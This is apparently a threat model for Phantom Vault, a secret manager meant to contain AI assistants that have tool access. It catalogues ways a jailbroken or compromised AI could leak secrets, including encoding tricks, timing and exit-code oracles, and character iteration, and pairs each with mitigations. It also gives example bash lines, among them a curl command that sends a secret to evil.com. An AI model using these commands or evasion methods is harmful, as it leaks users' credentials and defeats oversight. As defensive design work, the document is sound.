# Phantom Vault Threat Model

## Overview

This document describes the threat model for Phantom Vault, a secret manager designed for environments where AI assistants have access to development tools.

## Assets

1. **Secret Values**: API keys, tokens, passwords, certificates
2. **Vault Encryption Key**: Master key protecting all secrets
3. **Audit Log**: Record of all secret access
4. **Canary Secrets**: Honeypot credentials for breach detection

## Threat Actors

### T1: Malicious AI Assistant

An AI assistant that has been jailbroken, compromised, or is attempting to exceed its authorized access.

**Capabilities:**
- Can execute arbitrary commands via tools
- Can read/write files in the workspace
- Can make network requests
- Has knowledge of common security vulnerabilities

**Goals:**
- Exfiltrate secret values
- Establish persistence
- Escalate privileges

### T2: Compromised Dependency

A malicious or vulnerable dependency in the software supply chain.

**Capabilities:**
- Code execution within the process
- Access to process memory
- File system access

### T3: Network Attacker

An attacker with network access to the system.

**Capabilities:**
- Intercept network traffic
- DNS hijacking
- Man-in-the-middle attacks

## Attack Vectors

### A1: Direct Exfiltration

**Description:** AI attempts to output secret values directly.

**Mitigations:**
- Output sanitization (exact match)
- Multiple encoding detection
- Sliding window partial match

### A2: Encoded Exfiltration

**Description:** AI encodes secrets before outputting.

**Mitigations:**
- Base64 detection
- URL encoding detection
- Hex encoding detection
- HTML entity detection

### A3: Timing Oracle

**Description:** AI uses timing to leak information bit-by-bit.

```bash
if [ "${SECRET:0:1}" = "a" ]; then sleep 1; fi
```

**Mitigations:**
- Command pre-analysis
- Pattern blocking
- Constant-time padding

### A4: Exit Code Oracle

**Description:** AI uses exit codes to leak information.

```bash
[ "$SECRET" = "guess" ] && exit 0 || exit 1
```

**Mitigations:**
- Command pre-analysis
- Exit code pattern detection

### A5: Network Exfiltration

**Description:** AI sends secrets to external server.

```bash
curl "http://evil.com/?key=$SECRET"
```

**Mitigations:**
- Network egress filtering
- Command pre-analysis
- Sandboxed execution

### A6: Character Iteration

**Description:** AI iterates over secret characters.

```bash
for c in $(echo $SECRET | fold -w1); do echo $c; done
```

**Mitigations:**
- Command pre-analysis
- Loop pattern detection

### A7: Memory Scraping

**Description:** Attacker reads secrets from process memory.

**Mitigations:**
- Memory locking (mlock)
- Automatic zeroization
- SecretBuffer type

### A8: Core Dump Leakage

**Description:** Secrets leaked via crash dumps.

**Mitigations:**
- Disable core dumps for sensitive processes
- Memory locking prevents swap

## Security Controls

| Control | Attack Vectors Mitigated |
|---------|-------------------------|
| Output Sanitization | A1, A2 |
| Command Pre-Analysis | A3, A4, A5, A6 |
| Network Filtering | A5 |
| Process Sandboxing | A5, A7 |
| Memory Protection | A7, A8 |
| Canary Secrets | All (detection) |
| Audit Logging | All (forensics) |

## Assumptions

1. The operating system kernel is trusted
2. Hardware security modules (when used) are trusted
3. The user's master password is sufficiently strong
4. Physical access to the machine is controlled

## Out of Scope

1. Keyloggers capturing the master password
2. Physical attacks on hardware
3. Attacks requiring root/admin access
4. Social engineering of the user

## Residual Risks

1. **Novel Exfiltration**: New encoding or oracle methods
2. **Side Channels**: CPU-level timing or power analysis
3. **Dependency Vulnerabilities**: Zero-day in dependencies

## Recommendations

1. Regularly audit the blocked pattern list
2. Monitor canary access for breach detection
3. Review audit logs for anomalies
4. Keep dependencies updated
5. Use hardware security when available
